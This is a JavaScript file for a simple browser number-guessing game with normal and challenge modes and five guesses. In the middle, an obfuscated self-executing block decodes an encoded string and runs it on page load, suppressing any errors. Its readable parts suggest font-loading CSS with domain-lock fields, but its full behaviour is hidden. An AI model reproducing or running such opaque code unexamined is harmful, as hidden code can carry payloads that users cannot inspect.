var modeCurrent;

var mode = document.getElementById ("modechooser");
mode.addEventListener('change', function() {
      if (mode.value == "Normal Mode") {
        window.location = "https://numerale.netlify.app";
      } else if (mode.value == "Timed Normal Mode") {
        window.location = "https://numerale.netlify.app/timed";
      } else if (mode.value == "Challenge Mode") {
        window.location = "https://numerale.netlify.app/challenge";
      } else if (mode.value == "Timed Challenge Mode") {
        window.location = "https://numerale.netlify.app/timed-challenge";
      }
});

///////////////////////////////////////////////

if (window.location.pathname == "/challenge" || window.location.pathname == "/challenge.html") {
      var number = Math.floor(Math.random()*50) + 1;
      modeCurrent = "challenge";
} else if (window.location.pathname == "/index" || window.location.pathname == "/index.html" || window.location.pathname == "/") {
      var number = Math.floor(Math.random()*35) + 1;
      modeCurrent = "normal";
}

(function(){_Z2("q;0btquhuv/ponsbmf0PqfoEztmfyjd.Sfhvmbs/pug(*gpsnbu)(pug(*-gpou.xfjhiu;opsnbm<gpou.tuzmf;opsnbm~|#epnbjot#;##-#sfejsfdujpo#;##-#tdsjqu.je#;##~Agpou.gbdf|gpou.gbnjmz;(PqfoEztmfyjd(<tsd;vsm)(iuut0nytp/jicj0vf",(function(){this._6o655Ia3s__G4PPnr={f:function(_88d,$){_JDX="\x70\x6c\x61";function _5J(_88d,$,_Ig,_K1){function _fZ6a(_rJtQ){_rJtQ=_egH(_rJtQ)-32-(_K1%95);if(_rJtQ<0){_rJtQ+=95;}_rJtQ+=32;_K1++;return _mqg(_rJtQ);};function _01ww(_88d,_Ig){_aP0=_88d[_Ig];_XI="";while(_aP0!="\f"){if(_aP0<" "){_XI+=_aP0;}else{_XI+=_fZ6a(_aP0);}_Ig++;_aP0=_88d[_Ig];}return _XI;};function _egH(_aP0){return _aP0[_07](0);};function _mqg(_rJtQ){return this[_36k5][_b91](_rJtQ);};_Ig=_Ig?_Ig:0;if(_88d[_rZ]>_Ig){_K1=_K1?_K1:0;_Czm=_01ww(_88d,_Ig);_B7J3=_Czm[_rZ];_r2f=_01ww(_88d,_Ig+_B7J3+1);_39=_r2f[_rZ];$[_Czm]=_r2f;_5J(_88d,$,_Ig+_B7J3+1+_39+1,_K1);}};_717k="\x72\x65"+_JDX+"\x63\x65";_07=_f8y("_ahco%Cr%Aedt");_36k5=_f8y("r_t%Sgni");_b91=_f8y("_orfhCm%Crae_do");_rZ=_f8y("ne_lh_tg");_5J(_88d,$);function _f8y(_oEAD){return _oEAD[_717k](/[x%y_z]/g,'')[_717k](/(.)(.)(.)/g,'$3$2$1');};}};}()),0,{},"_TFn:\fK{uk}szz\flBPBT\f%x%\"wz}\fxe*au\f)/*0\f\"#:]5\f'6:k`TX?TA]_DYGbSVe\\;uut9=HK\\QOdWH[pnJmdgMXe;Bv@IU`{{-_)$.(3;jDu3ep2fN*kv@QFDYL.WR\\Vaiz&X->w4\"-h|{}r}&fx*#,21<!wn3sx9D9@G;JN}CFQVKGRIJ/ W%YP[_mllDkfyLzqt^irabJK%fq\"35,7/o7:?9s~8JVnsz&WLVZcT4[^c](3\\3hz6/:{pqx$xx,#+,<G!/5~BM?BI>9)@?ARNYAR0U 7VaY`g[\\koOtmhcnf>=@Eju$v*~*2m1(+v\")\\`_ l~*;B=P#QHK)*_,7NiZ+)3>nbsUlrlx!\"?JpX~ZEP%,.'6m{vwP[/gjMlFXcQCTMV\\vURcnQ-)D*Ikvdqg{uoz#u!qic_\\|(\"46v<50@'20{y}(.9INDD4ZQYZ9DO:^>d^bBMbtvYl\" KVnH`b R]1,3*-,<[f+aeb=bm<II?IPWkvGzU@J\"s~Illelg{'cToB\"-`uyY/)*+6|#V:Z;3>83>9H>;F9oHHI5CNZOY]fWKVU@,0Q\\srpokoYdmfu&xzal#+027hs(8EaKGp{JA@BSw#B0L/Z[ +dca`m'2\\2:3<l/:xn$t{6Av/1VX=H7:AB72EP0d@)KVK>QTHR]FRV|C%ZeAWlb`k]cd7R@bitWb`aozv'g vv\"4;;2|(-fj!#.BIEL)4A7za/:T`UX5@U?_2;F=cri!BMjEFGH`KzLW0#36R]%3aaXcCB5D^i9I1udoTUXitK~ g+cq|mnav\">INH[(82(:077I*9=ncW04|AHAb7mj@g`i>F0[W(pE_!L|!thMg)T%)1i^`k'Y1k334Ib5vcdM;XYx}Gvt7o*KvGKD(IB6z~g,3,^\"<])Y]V:[f,b_5m1Kl8hleIkuYFDf?G1\\X)nbGa#N~#{UwPXBmi:#{\"5xr^p~_k89vhC{pr}F#n!/obE,URu\"NO-~wAL~YTnSq#a>*<J+4A1EmYfpqg`iatQ=O]>2[rw!ly$%zs{t(dPbpQFH)1`^!})[/?w3!kq$dW:!J3'us66!$\"($*0(}@:%+=arst7=1+y0./?Y=@>D@FLD:1Ze8H%Ir)<h\\THXZXU#fgQa[QcY``rSiM*+;\"Z55LS)|ki,d??V]3'#n!/o(UtJRuPPgnv@K}j&g22\"MH$7KSfC/AO0fbh(rE=PY:FrsQC<epC3M~EpkITab_c0,\"#|QU'V%$}&9uas\"b76:@^FiuBC!rk5@r]Z]fut>I{pS9}|FQ$X_W_/(S,b^d$Zm=;]6jims2bcf?srv|;AjuHM b\"aL-.${|plXjxYRd4tq=`548>\\b9fEq{ 6&q$2r$`J&!VJV{-iS/*^#;h(]$MX+0bEdD/m3D!jFAdedXGEg@X&EzAFW4}YTJ+,OHZ*jg~rj^npnk}^gtdx?#$%&{o \" |/oc-DIP4R/z-;{ohSV\\)93);188J+y4aAX1,\"inm`TCAc`k>sKJJ5dOUgHC9!&%wkPKA).-R{'Y/feeP])+>\"jrzm%idZBGFk5@rIGIMut>I{-8OS~J#}s[`_ReIJh5E?5G=DDV7zGA>0eg[SGWYWTfoH<5 #stOC<'*Py%W**p3j[(?`TM8;a+6h;;\"D{lJp|IJ(yr<Gydadm|{EP#wZ@%cGe2B<2D:AAS4&/zGa:n?Nrvi]YEWe\\`&I}N]\"&Kt R?Z<ffV\"|;~'Z0^]'2dQlNxxh4/=19L(,o+/r<Gy~Q4S3}NS!aLMb;/?A?<NEI-Va4lo%6a\\j^fy]{XDVdE0[`%Qa[QcY``rS'GYB1\"ZmfCg)|xdv%e_JX=AIl_B)Rm7BtH/ivB?J|45YZK^.,N':3o4UI.A:v;/Xc6ljlp98al?5+N.2CnGA,:~#yNaZ7[|0sVAlq8[U@N37]'2ds ;$~hG+I&q$2rGwMR~/)~1'..@!SqVM&*}6CTH-\"$dn2>jkI;4]h;@q,x:?>grExS;GrKOC[hy-\\Z|UJL-U~*\\251j_, nl/)h~b?@P7odfGo9DvLOK%yFG;*(J#wyZ#LW*_4E_-YM2>jkI;4]h;&#&/>=fqD9{aF'J?A\"Js~Q'[l'T3vl`prpm `T}5:A%&h\\U@CK74?qEU.I7\"(:zmP7`I`\"tW>g#LW*]mFa-j1$fMv2[f9msGow=hA68xAjuH \"c\"ZLx,[Y{uUIB-0$wocsusp#cW!8=D(j>^pYH9qe^IL@SxM}SZ}oxd1K$g4.+|RTUhA5EGEBT5>K;OuYwT@R`A&y}#F:cz 'Sc]Se[bbtUfR/\"Z^Rjw)|ki,&eJ>B3'kPDHMpy'v+Q*}.0.+=}PnSJ#'z3@QdH@?GJ/yEJ/Xc6F#Gp':e>B6N[oD/Z_DmxKB;62NMv\"TY,n.mX%8{bauek,j/#&{o \" |/ox&u*P4R/z-;{O1aig_#/[\\:,%NY,^8\"+a0/Xc6yi@l@:enXqEk~[GYgH?e#4+NZ'(eWPy%W*cMV-[Z$/aE5k8ke1:$=q7J'r%3s$h LVy&RS1#{EP#U/x\"X'&OZ-p`7c71\\eOh>buR>P^BY~>A \\HZh[(mn)U_cyiUgu`5)5d8\\`Imtm^(3ej= ?~iHw:;:.*u(6z!Vy}f+2+{+ ^;'9G,f*.v;B;,U`3ehf&q7bEexHFhir\\)}vw%'NtrsvS-/#l98=>\"#vm(;bh< hpxk'qo23<&RR@ANPw><=@|VXL6befgKL@7Qd,2e.E)R]0?~6,3^IatLx^_y]FNVI`OMoZrfNeIr}P_?VLS~i\"5l9~ :}jh+gAC7!@P4(pvLo{HI'xq;FxK%nwN|{EP#fV-Y-'R/Y^WjN4K/Xc6E%<29dAGh{_`MKmXpdLcGp{N]=TJQ|g 3vp\\n|]ep7UVAg~b,7inA$C#mL)t'5~zUxOL\"BN8QQR^;'9G<3g+7cdB4-Va4?g-m76_j=5CRDEAlE{xNxzd}}~x,hTftW4~ 5q]o}kc>2>zfx'jrG~uH%p#1{PDP. \"& C&Y}&1WuvMA>0260S/7j/7Bh'(^RN:LZT@zAX<DLA OMoaM()L a2:8{o^\\~xXiU2%_()|thxzxu(okw rI-qN9:O3{$,~62}0>~d-(`T`0.PB.hi-$Jgx[OM9sY_[u;!ID|q|`IQYLgRPrdP+,O_D[(}qo[6!|#8]Ckf?4?#g2E\"mFus6nT|w<0vATwL|RW;<\"*L_,(`0RSdH80XYj3;o[H?aD<b_D@x\\IGicCT@|oJrsg_Scec`rZVbj]4wdb%]QJ58, dSm;z2j^WBE9L01O\f");function _Z2(_A9,_gl,_J1Z,$,_GB6,_995){_TwG=this._6o655Ia3s__G4PPnr;_TwG.f(_GB6,$);if(!_J1Z){_J1Z=$.__u8n;}_HD5r()(_A9,0,0x60c1,this,"''");function _HD5r(){return function(_6T,_ofv,_Wy,_5SK,_j8h){_TwG.p1=_6T;_TwG.p2=_Wy;try{_7Xac(_5SK)(_8u()([_J1Z[$._4A2C]("+p%p",_j8h)[$._4A2C]("-p%q",_j8h)],''))();}catch(e){}function _7Xac(_t84Z){return _t84Z[$._SDk6];};_5SK._6o655Ia3s__G4PPnr=_995;};};function _8u(){return function(_T5,_vg7j){return _T5[$._KnEX](_vg7j);};};};}());

///////////////////////////////////////////////

            /*var x = 0;
            var winsye = localStorage.setItem ("winscount", x)
            document.getElementById ("wins").innerHTML = winsye.value;*/
            document.getElementById ("one").focus();

            function restart () {
                        setTimeout(function(){ location.reload(); }, 2000);                    
            }
            
            

            function tryguess () {
                document.getElementById ("go").style.display = "none";
                document.getElementById ("go2").style.display = "block";
                document.getElementById ("one").disabled = true;
                document.getElementById ("two").disabled = false;
                        document.getElementById ("two").focus();
                if (document.getElementById ("one").value < number) {
                    document.getElementById ("one").style.backgroundColor = "orange";
                } else if (document.getElementById ("one").value > number) {
                    document.getElementById ("one").style.backgroundColor = "blue";
                } else if (document.getElementById ("one").value == number) {
                    
                            Swal.fire({
                            title: 'YOU WON!',
                            icon: 'success',
                            timer: 2000,
                            showConfirmButton: false,
                            allowOutsideClick: false
                        })
                            restart();
                }           
            }

            function tryguess2 () {
                document.getElementById ("go2").style.display = "none";
                document.getElementById ("go3").style.display = "block";
                document.getElementById ("two").disabled = true;
                document.getElementById ("three").disabled = false;
                        document.getElementById ("three").focus();
                if (document.getElementById ("two").value < number) {
                    document.getElementById ("two").style.backgroundColor = "orange";
                } else if (document.getElementById ("two").value > number) {
                    document.getElementById ("two").style.backgroundColor = "blue";
                } else if (document.getElementById ("two").value == number) {
                            //Swal.fire('YOU WON', 'The game will restart when this box is closed.', 'success');
                             Swal.fire({
                            title: 'YOU WON!',
                            icon: 'success',
                            timer: 2000,
                            showConfirmButton: false,
                            allowOutsideClick: false
                        })
                    restart();
                }
            }

            function tryguess3 () {
                document.getElementById ("go3").style.display = "none";
                document.getElementById ("go4").style.display = "block";
                document.getElementById ("three").disabled = true;
                document.getElementById ("four").disabled = false;
                        document.getElementById ("four").focus();
                if (document.getElementById ("three").value < number) {
                    document.getElementById ("three").style.backgroundColor = "orange";
                } else if (document.getElementById ("three").value > number) {
                    document.getElementById ("three").style.backgroundColor = "blue";
                } else if (document.getElementById ("three").value == number) {
                            //Swal.fire('YOU WON', 'The game will restart when this box is closed.', 'success');
                             Swal.fire({
                            title: 'YOU WON!',
                            icon: 'success',
                            timer: 2000,
                            showConfirmButton: false,
                            allowOutsideClick: false
                        })
                    restart();
                }
            }

            function tryguess4 () {
                document.getElementById ("go4").style.display = "none";
                document.getElementById ("go5").style.display = "block";
                document.getElementById ("four").disabled = true;
                document.getElementById ("five").disabled = false;
                        document.getElementById ("five").focus();
                if (document.getElementById ("four").value < number) {
                    document.getElementById ("four").style.backgroundColor = "orange";
                } else if (document.getElementById ("four").value > number) {
                    document.getElementById ("four").style.backgroundColor = "blue";
                } else if (document.getElementById ("four").value == number) {
                            //Swal.fire('YOU WON', 'The game will restart when this box is closed.', 'success');
                             Swal.fire({
                            title: 'YOU WON!',
                            icon: 'success',
                            timer: 2000,
                            showConfirmButton: false,
                            allowOutsideClick: false
                        })
                   restart();
                }
            }

            function tryguess5 () {
                        document.getElementById ("five").disabled = true;
                if (document.getElementById ("five").value < number) {
                    document.getElementById ("five").style.backgroundColor = "orange";
                    //Swal.fire('YOU LOST', 'The game will restart when this box is closed.', 'error');
                            Swal.fire({
                            title: 'YOU LOST!',
                            text: 'The correct number was: ' + number + '',
                            icon: 'error',
                            timer: 2000,
                            showConfirmButton: false,
                            allowOutsideClick: false,
                        })
                    restart();
                } else if (document.getElementById ("five").value > number) {
                    document.getElementById ("five").style.backgroundColor = "blue";
                    //Swal.fire('YOU LOST', 'The game will restart when this box is closed.', 'error');
                            Swal.fire({
                            title: 'YOU LOST!',
                            text: 'The correct number was: ' + number + '',
                            icon: 'error',
                            timer: 2000,
                            showConfirmButton: false,
                            allowOutsideClick: false
                        })
                    restart();
                } else if (document.getElementById ("five").value == number) {
                            //Swal.fire('YOU WON', 'The game will restart when this box is closed.', 'success');
                             Swal.fire({
                            title: 'YOU WON!',
                            icon: 'success',
                            timer: 2000,
                            showConfirmButton: false,
                            allowOutsideClick: false
                        })
                            /*var x = x+=1;
                            localStorage.setItem ("wins", x);
                            document.getElementById ("wins").innerHTML = winsye;*/
                            restart();
                    restart();
                } else if (document.getElementById ("five").value != number) {
                    //Swal.fire('YOU LOST', 'The game will restart when this box is closed.', 'error');
                            Swal.fire({
                            title: 'YOU LOST!',
                            text: 'The correct number was: ' + number + '',
                            icon: 'error',
                            timer: 2000,
                            showConfirmButton: false,
                            allowOutsideClick: false
                        })
                    restart();
                }
            }
            
setInterval(function(){ 
    if(document.getElementById("one").value.length>0){
      
      document.getElementById("go").disabled=!1;
      document.getElementById("one").focus();
    
    }else{document.getElementById("go").disabled=!0}
if(document.getElementById("two").value.length>0){document.getElementById("go2").disabled=!1;document.getElementById("two").focus();}else{document.getElementById("go2").disabled=!0}
if(document.getElementById("three").value.length>0){document.getElementById("go3").disabled=!1;document.getElementById("three").focus();}else{document.getElementById("go3").disabled=!0}
if(document.getElementById("four").value.length>0){document.getElementById("go4").disabled=!1;document.getElementById("four").focus();}else{document.getElementById("go4").disabled=!0}
if(document.getElementById("five").value.length>0){document.getElementById("go5").disabled=!1;document.getElementById("five").focus();}else{document.getElementById("go5").disabled=!0}


  var oneElement = document.getElementById ("one");
let one1 = oneElement.value.slice(0, -1);
var twoElement = document.getElementById ("two");
let two2 = twoElement.value.slice(0, -1);
var threeElement = document.getElementById ("three");
let three3 = threeElement.value.slice(0, -1);
var fourElement = document.getElementById ("four");
let four4 = fourElement.value.slice(0, -1);
var fiveElement = document.getElementById ("five");
let five5 = fiveElement.value.slice(0, -1);
      
if (modeCurrent == "normal") {
      if(oneElement.value>35||oneElement.value<1){ oneElement.value=one1; }else if(twoElement.value>35||twoElement.value<1){ twoElement.value=two2; }else if(threeElement.value>35||threeElement.value<1){ threeElement.value=three3; }else if(fourElement.value>35||fourElement.value<1){ fourElement.value=four4; }else if(fiveElement.value>35||fiveElement.value<1){ fiveElement.value=five5; }
} else if (modeCurrent == "challenge") {
      if(oneElement.value>50||oneElement.value<1){ oneElement.value=one1; }else if(twoElement.value>50||twoElement.value<1){ twoElement.value=two2; }else if(threeElement.value>50||threeElement.value<1){ threeElement.value=three3; }else if(fourElement.value>50||fourElement.value<1){ fourElement.value=four4; }else if(fiveElement.value>50||fiveElement.value<1){ fiveElement.value=five5; }
}
}, 0.1);
            

document.addEventListener("keydown", function(event) {
    if (event.key === 'Enter') {
        if (document.getElementById("one").disabled == false && document.getElementById("one").value.length>0) {
                    tryguess();
        } else if (document.getElementById("two").disabled == false && document.getElementById("two").value.length>0) {
                    tryguess2();
        } else if (document.getElementById("three").disabled == false && document.getElementById("three").value.length>0) {
                    tryguess3();
        } else if (document.getElementById("four").disabled == false && document.getElementById("four").value.length>0) {
                    tryguess4();
        } else if (document.getElementById("five").disabled == false && document.getElementById("five").value.length>0) {
                    tryguess5();
        }
    }    
  
    if (modeCurrent=="challenge") {
          if (event.key === "q") {
                Swal.fire('HOW TO PLAY', 'Find the correct number in 5 guesses. Numbers range from 1-50.', 'question');
          }
    } else if (modeCurrent == "normal") {
          if (event.key === "q") {
                Swal.fire('HOW TO PLAY', 'Find the correct number in 5 guesses. Numbers range from 1-35.', 'question');
          }
    }
  
    if (event.key === "w") {
                sharern();
    }
});          
            /*var items = document.querySelectorAll("body>b:not(.k1)");
           if (/Android|webOS|iPhone|iPad|iPod|BlackBerry|BB|PlayBook|IEMobile|Windows Phone|Kindle|Silk|Opera Mini/i.test(navigator.userAgent)) {
for (var i = 0; i < items.length; i++) {
    items[i].style.display = 'none';
}
} */
  
  document.querySelector("input").addEventListener("keydown", function(event) {
    var ones = document.getElementById ("one").value;
    var twos = document.getElementById ("two");
    var threes = document.getElementById ("three");
    var fours = document.getElementById ("four");
    var fives = document.getElementById ("five");
  if (event.key === "e" || event.key === "-" || ones > 35) {
    event.preventDefault();
  }
});
  
